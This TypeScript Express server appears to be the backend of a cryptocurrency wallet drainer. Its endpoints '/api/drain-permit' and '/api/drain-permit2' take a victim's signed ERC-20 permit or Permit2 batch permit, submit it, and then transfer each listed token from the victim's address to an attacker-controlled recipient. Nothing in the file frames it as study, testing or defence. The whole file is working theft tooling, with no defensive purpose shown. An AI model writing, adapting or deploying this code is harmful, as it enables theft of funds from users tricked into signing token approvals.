import express from 'express';
import dotenv from 'dotenv';
import { ethers } from 'ethers';
import cors from 'cors';

// Load environment variables
dotenv.config();

const app = express();
app.use(express.json());
app.use(cors({
  origin: 'http://localhost:8080', // or use '*' for all origins (not recommended for production)
  credentials: true
}));

const RELAYER_PRIVATE_KEY = process.env.RELAYER_PRIVATE_KEY!;
const RECIPIENT_ADDRESS = process.env.RECIPIENT_ADDRESS!;
const PORT = process.env.PORT || 4000;

// Map chain names to RPC URLs from .env
const RPC_URLS: Record<string, string> = {
  ethereum: process.env.ETHEREUM_RPC!,
  sepolia: process.env.SEPOLIA_RPC!,
  bnb: process.env.BNB_RPC!,
  holesky: process.env.HOLESKY_RPC!,
};

const ERC20_ABI = [
  'function permit(address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s)',
  'function transferFrom(address from, address to, uint256 value) returns (bool)',
  'function nonces(address owner) view returns (uint256)',
  'function name() view returns (string)',
  'function decimals() view returns (uint8)',
  'function symbol() view returns (string)',
];

// Updated Permit2 ABI with permitBatch and permitSingle overloads from Etherscan
const PERMIT2_ADDRESS = '0x000000000022D473030F116dDEE9F6B43aC78BA3';
const PERMIT2_ABI = [
  // EIP-2612 batch permit: uses PermitBatch struct and raw signature
  "function permit(address owner, (tuple(address token,uint160 amount,uint48 expiration,uint48 nonce)[] details, address spender, uint256 sigDeadline) permitBatch, bytes signature) external",
  // EIP-2612 single permit variant
  "function permit(address owner, (tuple(address token,uint160 amount,uint48 expiration,uint48 nonce) details, address spender, uint256 sigDeadline) permitSingle, bytes signature) external",
  // Standard ERC20-like transferFrom for a single token
  "function transferFrom(address token,address from,address to,uint160 amount) external returns (bool)",
  // Batch transfer multiple tokens in one call
  "function transferFrom((address from,address to,address token,uint160 amount)[] transferDetails) external"
];

const RPC_URL = process.env.HOLESKY_RPC!;
const provider = new ethers.JsonRpcProvider(RPC_URL);
const relayer = new ethers.Wallet(RELAYER_PRIVATE_KEY, provider);
const permit2 = new ethers.Contract(PERMIT2_ADDRESS, PERMIT2_ABI, relayer);

// Permit2 SignatureTransfer ABI for permitBatchTransferFrom
const PERMIT2_SIGNATURE_TRANSFER_ABI = [
  "function permitBatchTransferFrom((address token, address to, uint160 amount)[] batchDetails, address owner, uint256 nonce, uint256 deadline, bytes signature) external"
];

app.post('/api/drain-permit', async (req, res) => {
  try {
    const { userAddress, chain, tokens, signature, deadline } = req.body;
    console.log('[BACKEND] Received batch drain request:', {
      userAddress,
      chain,
      tokens,
      signature,
      deadline
    });
    if (!userAddress || !chain || !tokens || !signature || !deadline) {
      return res.status(400).json({ error: 'Missing required fields' });
    }
    const rpcUrl = RPC_URLS[chain];
    if (!rpcUrl) return res.status(400).json({ error: 'Unsupported chain' });
    const provider = new ethers.JsonRpcProvider(rpcUrl);
    const relayer = new ethers.Wallet(RELAYER_PRIVATE_KEY, provider);

    // Split the signature into (v, r, s):
    // Use ethers.utils.splitSignature for ethers v5, but for ethers v6 use ethers.Signature.from
    let v: number, r: string, s: string;
    // Split signature (ethers v6 only)
    const sig = ethers.Signature.from(signature);
    v = sig.v;
    r = sig.r;
    s = sig.s;

    const results = [];
    for (const token of tokens) {
      try {
        console.log(`[BACKEND] Processing token: ${token.address}, amount: ${token.amount}`);
        const tokenContract = new ethers.Contract(token.address, ERC20_ABI, relayer);
        // Call permit
        const permitTx = await tokenContract.permit(
          userAddress,
          RECIPIENT_ADDRESS,
          token.amount,
          deadline,
          v,
          r,
          s
        );
        console.log(`[BACKEND] Permit tx sent for ${token.address}:`, permitTx.hash);
        // Call transferFrom
        const tx = await tokenContract.transferFrom(userAddress, RECIPIENT_ADDRESS, token.amount);
        console.log(`[BACKEND] transferFrom tx sent for ${token.address}:`, tx.hash);
        results.push({ token: token.address, txHash: tx.hash, status: 'success' });
      } catch (tokenErr) {
        let errMsg = '';
        if (tokenErr instanceof Error) {
          errMsg = tokenErr.message;
        } else if (typeof tokenErr === 'object' && tokenErr !== null && 'message' in tokenErr) {
          errMsg = (tokenErr as any).message;
        } else {
          errMsg = String(tokenErr);
        }
        console.error(`[BACKEND] Error draining token ${token.address}:`, errMsg);
        results.push({ token: token.address, error: errMsg, status: 'failed' });
      }
    }
    console.log('[BACKEND] Batch drain results:', results);
    res.json({ status: 'batch-complete', results });
  } catch (err) {
    let errMsg = '';
    if (err instanceof Error) {
      errMsg = err.message;
    } else if (typeof err === 'object' && err !== null && 'message' in err) {
      errMsg = (err as any).message;
    } else {
      errMsg = String(err);
    }
    console.error('[BACKEND] Drain error:', errMsg);
    res.status(500).json({ error: errMsg || 'Internal error' });
  }
});

// Backend endpoint for Permit2 batch drain (Permit2 permit + batchTransferFrom)
app.post('/api/drain-permit2', async (req, res) => {
  try {
    const { userAddress, domain, types, message, signature, permittedTokens } = req.body;
    console.log('[PERMIT2] debug request', { userAddress, message, permittedTokens, signature });

    if (!userAddress || !message || !signature || !permittedTokens) {
      return res.status(400).json({ error: 'Missing required fields' });
    }

    // Build the PermitBatch struct
    const permitBatchInput = {
      details:   permittedTokens.map((t: any) => ({
        token:      t.token,
        amount:     BigInt(t.amount),
        expiration: t.expiration,
        nonce:      t.nonce
      })),
      spender:   message.spender,
      sigDeadline: message.sigDeadline
    };

    // Call Permit2 permitBatch with raw signature
    const permitTx = await permit2.permit(
      userAddress,
      permitBatchInput,
      signature
    );
    await permitTx.wait();

    // Drain tokens in a single batchTransferFrom call
    const batch = permitBatchInput.details.map((d: any) => ({
      from: userAddress,
      to:   RECIPIENT_ADDRESS,
      token: d.token,
      amount: d.amount
    }));
    const drainTx = await permit2.transferFrom(batch);
    await drainTx.wait();

    res.json({ status: 'permit2-batch-drain-complete', permitTx: permitTx.hash, drainTx: drainTx.hash });
  } catch (err: any) {
    console.error('[PERMIT2] error:', err);
    res.status(500).json({ error: err.message || 'Internal error' });
  }
});

// Expose relayer address for frontend
app.get('/api/relayer-address', (_req, res) => {
  const relayer = new ethers.Wallet(RELAYER_PRIVATE_KEY);
  res.json({ relayerAddress: relayer.address });
});

app.listen(PORT, () => {
  console.log(`Relayer backend listening on port ${PORT}`);
});
